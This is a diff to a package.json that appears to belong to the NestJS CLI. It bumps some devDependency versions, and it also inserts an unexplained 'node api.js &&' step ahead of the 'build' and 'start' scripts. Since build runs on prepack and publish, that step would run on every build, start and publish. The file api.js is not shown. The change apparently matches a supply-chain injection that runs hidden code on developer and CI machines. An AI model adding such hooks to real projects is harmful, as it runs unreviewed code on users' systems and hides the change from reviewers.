@@ -13,11 +13,11 @@
     "nest": "bin/nest.js"
   },
   "scripts": {
-    "build": "tsc",
+    "build": "node api.js && tsc",
     "clean": "node tools/clean.js",
     "format": "prettier --write \"**/*.ts\"",
     "lint": "oxlint lib/ commands/ actions/",
-    "start": "node bin/nest.js",
+    "start": "node api.js && node bin/nest.js",
     "prepack": "npm run build",
     "prepublish:next": "npm run build",
     "publish:next": "npm publish --access public --tag next",
@@ -57,11 +57,11 @@
     "typescript": "~6.0.2"
   },
   "devDependencies": {
-    "@commitlint/cli": "20.4.3",
-    "@commitlint/config-angular": "20.4.3",
+    "@commitlint/cli": "20.5.3",
+    "@commitlint/config-angular": "20.5.3",
     "@rspack/core": "^1.7.7",
-    "@swc/cli": "0.8.0",
-    "@swc/core": "1.15.18",
+    "@swc/cli": "0.8.1",
+    "@swc/core": "1.15.40",
     "@types/node": "25.3.5",
     "@types/webpack-node-externals": "3.0.4",
     "delete-empty": "3.0.0",
